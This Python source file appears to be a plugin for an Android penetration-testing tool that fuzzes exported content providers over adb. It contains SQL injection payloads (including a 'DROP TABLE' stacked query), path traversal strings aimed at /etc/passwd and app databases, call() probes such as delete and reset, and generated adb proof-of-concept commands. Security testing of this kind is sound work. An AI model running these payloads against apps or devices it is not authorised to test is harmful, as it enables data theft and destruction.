"""ContentProviderPlugin — SQL injection, path traversal, and permission bypass on content providers."""

from __future__ import annotations

import re
from typing import TYPE_CHECKING

from backend.plugins.base import (
    BasePlugin,
    PluginCategory,
    PluginFinding,
    PoC,
    ValidationVerdict,
)

if TYPE_CHECKING:
    from backend.core.device_manager import DeviceHandle
    from backend.core.apk_analyzer import APKAnalysis


_SQLI_PAYLOADS = [
    ("single_quote", "'"),
    ("union_select", "' UNION SELECT 1,2,3--"),
    ("union_select_wide", "' UNION SELECT 1,2,3,4,5,6,7,8--"),
    ("boolean_true", "' OR '1'='1"),
    ("boolean_false", "' OR '1'='2"),
    ("stacked_query", "'; DROP TABLE test;--"),
    ("sleep_blind", "' OR (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)--"),
    ("comment_bypass", "'/**/OR/**/1=1--"),
]

_PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "../../../data/data/{pkg}/shared_prefs/",
    "../../../data/data/{pkg}/databases/",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\etc\\passwd",
    "../../../proc/self/cmdline",
]

_CALL_METHOD_PAYLOADS = [
    ("getType", []),
    ("openFile", ["../../../etc/passwd"]),
    ("query", ["1=1"]),
]

_CRASH_RE = re.compile(
    r"(FATAL EXCEPTION|SecurityException|SQLiteException|"
    r"IllegalArgumentException|FileNotFoundException|"
    r"NullPointerException|android\.database\.sqlite)",
    re.IGNORECASE,
)

_SQLI_INDICATORS = re.compile(
    r"(syntax error|unrecognized token|no such column|"
    r"near \"|\): while compiling|SQLITE_ERROR|"
    r"android\.database\.sqlite\.SQLiteException)",
    re.IGNORECASE,
)

_DATA_LEAK_RE = re.compile(
    r"(Row: \d+|vnd\.android|_id=\d+|password|secret|token|"
    r"api_key|private_key|credential|session_id)",
    re.IGNORECASE,
)


class ContentProviderPlugin(BasePlugin):
    name = "content_provider"
    display_name = "Content Provider Tester"
    description = (
        "Tests exported content providers for SQL injection, path traversal, "
        "call() method abuse, column enumeration, and permission bypass."
    )
    version = "1.0.0"
    category = PluginCategory.FUZZER
    requires_device = True
    attack_vectors = [
        "sql_injection",
        "path_traversal",
        "permission_bypass",
        "content_provider_leak",
    ]

    async def run(self, analysis, device, progress_callback=None) -> list[PluginFinding]:
        findings: list[PluginFinding] = []

        providers = [
            c for c in analysis.components
            if c.type == "provider" and c.exported
        ]
        total = len(providers)
        if not total:
            return findings

        for idx, prov in enumerate(providers):
            if self.is_cancelled:
                break

            authority = self._extract_authority(prov, analysis.package_name)
            if not authority:
                continue

            base_uri = f"content://{authority}"

            # enumerate paths from intent-filters / known patterns
            paths = self._guess_paths(prov)

            for path in paths:
                uri = f"{base_uri}/{path}" if path else base_uri

                # ---- SQL injection tests ----
                sqli_findings = await self._test_sqli(device, uri, prov, analysis.package_name)
                findings.extend(sqli_findings)

                # ---- Path traversal ----
                pt_findings = await self._test_path_traversal(
                    device, base_uri, prov, analysis.package_name,
                )
                findings.extend(pt_findings)

            # ---- Column enumeration ----
            col_finding = await self._enumerate_columns(device, base_uri, prov)
            if col_finding:
                findings.append(col_finding)

            # ---- call() method fuzzing ----
            call_findings = await self._test_call_methods(
                device, authority, prov, analysis.package_name,
            )
            findings.extend(call_findings)

            # ---- Permission bypass (query without expected perm) ----
            bypass = await self._test_permission_bypass(device, base_uri, prov)
            if bypass:
                findings.append(bypass)

            if progress_callback:
                await progress_callback(
                    plugin=self.name,
                    progress=(idx + 1) / total,
                    message=f"Tested provider {prov.name}",
                )

        return findings

    # ------------------------------------------------------------------
    # SQL Injection
    # ------------------------------------------------------------------
    async def _test_sqli(self, device, uri, prov, pkg) -> list[PluginFinding]:
        results: list[PluginFinding] = []
        for name, payload in _SQLI_PAYLOADS:
            if self.is_cancelled:
                return results

            # Injection in projection
            await device.clear_logcat()
            proj_out = await device.content_query(uri, projection=payload)
            logcat = await device.logcat_snapshot(lines=200)

            if _SQLI_INDICATORS.search(proj_out + logcat):
                results.append(PluginFinding(
                    title=f"SQL injection in projection ({name}) — {prov.name}",
                    description=(
                        f"Content provider {prov.name} is vulnerable to SQL injection "
                        f"via projection parameter. Payload: {payload}"
                    ),
                    severity="critical",
                    component_name=prov.name,
                    component_type="provider",
                    cvss_score=9.1,
                    cwe_id="CWE-89",
                    mstg_id="MSTG-PLATFORM-2",
                    owasp_mobile="M1",
                    poc_command=f'adb shell content query --uri {uri} --projection "{payload}"',
                    response_data=proj_out[:2000],
                    logcat_snippet=logcat[-1500:],
                    evidence={"payload_name": name, "injection_point": "projection"},
                ))
                break  # one confirmed SQLi per injection point is enough

            # Injection in selection (WHERE)
            await device.clear_logcat()
            sel_out = await device.content_query(uri, selection=payload)
            logcat = await device.logcat_snapshot(lines=200)

            if _SQLI_INDICATORS.search(sel_out + logcat):
                results.append(PluginFinding(
                    title=f"SQL injection in selection ({name}) — {prov.name}",
                    description=(
                        f"Content provider {prov.name} is vulnerable to SQL injection "
                        f"via selection/WHERE parameter. Payload: {payload}"
                    ),
                    severity="critical",
                    component_name=prov.name,
                    component_type="provider",
                    cvss_score=9.1,
                    cwe_id="CWE-89",
                    mstg_id="MSTG-PLATFORM-2",
                    owasp_mobile="M1",
                    poc_command=f'adb shell content query --uri {uri} --where "{payload}"',
                    response_data=sel_out[:2000],
                    logcat_snippet=logcat[-1500:],
                    evidence={"payload_name": name, "injection_point": "selection"},
                ))
                break

        return results

    # ------------------------------------------------------------------
    # Path Traversal
    # ------------------------------------------------------------------
    async def _test_path_traversal(self, device, base_uri, prov, pkg) -> list[PluginFinding]:
        results: list[PluginFinding] = []
        for raw_payload in _PATH_TRAVERSAL_PAYLOADS:
            if self.is_cancelled:
                return results
            payload = raw_payload.replace("{pkg}", pkg)
            uri = f"{base_uri}/{payload}"
            await device.clear_logcat()
            out = await device.content_query(uri)
            logcat = await device.logcat_snapshot(lines=200)

            # success indicators: actual file content, rows returned
            if out and "No result found" not in out and "Error" not in out:
                if any(kw in out.lower() for kw in ("root:", "/bin/", "<?xml", "_id=", "row:")):
                    results.append(PluginFinding(
                        title=f"Path traversal via content provider — {prov.name}",
                        description=(
                            f"Content provider {prov.name} allows path traversal. "
                            f"Accessed: {payload}"
                        ),
                        severity="high",
                        component_name=prov.name,
                        component_type="provider",
                        cvss_score=7.5,
                        cwe_id="CWE-22",
                        mstg_id="MSTG-PLATFORM-2",
                        owasp_mobile="M1",
                        poc_command=f"adb shell content query --uri {uri}",
                        response_data=out[:2000],
                        logcat_snippet=logcat[-1000:],
                    ))
                    break
        return results

    # ------------------------------------------------------------------
    # Column enumeration
    # ------------------------------------------------------------------
    async def _enumerate_columns(self, device, base_uri, prov) -> PluginFinding | None:
        out = await device.content_query(base_uri, projection="* FROM sqlite_master--")
        if "table" in out.lower() and "name=" in out.lower():
            return PluginFinding(
                title=f"Database schema leak via projection — {prov.name}",
                description=(
                    f"Projection injection on {prov.name} exposes sqlite_master, "
                    f"revealing full database schema."
                ),
                severity="high",
                component_name=prov.name,
                component_type="provider",
                cvss_score=7.5,
                cwe_id="CWE-200",
                mstg_id="MSTG-STORAGE-6",
                owasp_mobile="M2",
                poc_command=f'adb shell content query --uri {base_uri} --projection "* FROM sqlite_master--"',
                response_data=out[:3000],
            )
        return None

    # ------------------------------------------------------------------
    # call() method fuzzing
    # ------------------------------------------------------------------
    async def _test_call_methods(self, device, authority, prov, pkg) -> list[PluginFinding]:
        results: list[PluginFinding] = []
        methods = ["getType", "openFile", "query", "update", "delete", "insert",
                    "backup", "restore", "export", "config", "reset", "execute"]
        for method in methods:
            if self.is_cancelled:
                return results
            cmd = f'content call --uri content://{authority} --method {method} --arg ""'
            await device.clear_logcat()
            out = await device.shell(cmd)
            logcat = await device.logcat_snapshot(lines=200)

            if out and "Error" not in out and "null" not in out.lower():
                results.append(PluginFinding(
                    title=f"Unprotected call() method '{method}' — {prov.name}",
                    description=(
                        f"Content provider {prov.name} exposes call() method '{method}' "
                        f"which returned data without proper authorization."
                    ),
                    severity="medium",
                    component_name=prov.name,
                    component_type="provider",
                    cwe_id="CWE-862",
                    mstg_id="MSTG-PLATFORM-2",
                    owasp_mobile="M1",
                    poc_command=f"adb shell {cmd}",
                    response_data=out[:2000],
                    logcat_snippet=logcat[-1000:],
                ))
        return results

    # ------------------------------------------------------------------
    # Permission bypass
    # ------------------------------------------------------------------
    async def _test_permission_bypass(self, device, base_uri, prov) -> PluginFinding | None:
        if not prov.permission:
            return None
        # If provider declares a permission, try querying without it
        out = await device.content_query(base_uri)
        if out and "SecurityException" not in out and "Permission Denial" not in out:
            if "Row:" in out or "_id=" in out:
                return PluginFinding(
                    title=f"Permission bypass on provider — {prov.name}",
                    description=(
                        f"Content provider {prov.name} declares permission "
                        f"'{prov.permission}' but returns data without it being granted."
                    ),
                    severity="high",
                    component_name=prov.name,
                    component_type="provider",
                    cvss_score=7.5,
                    cwe_id="CWE-862",
                    mstg_id="MSTG-PLATFORM-2",
                    owasp_mobile="M1",
                    poc_command=f"adb shell content query --uri {base_uri}",
                    response_data=out[:2000],
                    evidence={"declared_permission": prov.permission},
                )
        return None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _extract_authority(prov, pkg) -> str:
        # authority usually in component metadata or matches package name
        for filt in prov.intent_filters:
            auth = filt.get("authority") or filt.get("authorities")
            if auth:
                return auth
        # fallback: use component name as authority pattern
        name = prov.name
        if name.startswith("."):
            name = pkg + name
        return name

    @staticmethod
    def _guess_paths(prov) -> list[str]:
        paths = [""]
        known = ["users", "data", "files", "items", "accounts", "messages",
                 "settings", "config", "search", "contacts", "notes"]
        for filt in prov.intent_filters:
            p = filt.get("path") or filt.get("pathPrefix") or filt.get("pathPattern")
            if p:
                paths.append(p.lstrip("/"))
        paths.extend(known)
        return paths

    async def generate_poc(self, finding: PluginFinding) -> PoC | None:
        if finding.poc_command:
            return PoC(
                poc_type="adb_command",
                commands=[finding.poc_command],
                expected_result="SQL error or data returned without authorization",
            )
        return None
